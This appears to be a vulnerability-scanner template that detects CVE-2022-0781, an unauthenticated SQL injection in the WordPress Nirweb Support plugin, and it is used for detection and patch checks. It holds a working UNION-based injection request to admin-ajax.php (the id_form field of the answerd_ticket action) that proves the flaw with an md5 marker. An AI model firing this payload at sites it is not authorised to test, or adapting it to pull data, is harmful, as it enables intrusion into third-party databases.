id: CVE-2022-0781
info:
  name: WordPress Nirweb Support <2.8.2 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Nirweb Support plugin before version 2.8.2 is vulnerable
    to SQL injection, which allows attackers to obtain sensitive data, modify data,
    and execute unauthorized administrative operations.
  reference:
  - https://wpscan.com/vulnerability/1a8f9c7b-a422-4f45-a516-c3c14eb05161
  - https://wordpress.org/plugins/nirweb-support/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0781
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0781
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Nirweb support plugin can
      allow an attacker to gain access to sensitive information, modify data, and
      execute unauthorized administrative operations in the context of the affected
      site, ultimately resulting in a significant impact on its security and integrity.
    recommendation: It is recommended to update the WordPress Nirweb Support plugin
      to version 2.8.2 or higher to avoid potential SQL injection vulnerabilities.
  tags: cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,nirweb-support,unauth
variables:
  num: '999999999'
requests:
- raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL--
    -

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5(num)}}'
  - type: status
    status:
    - 200
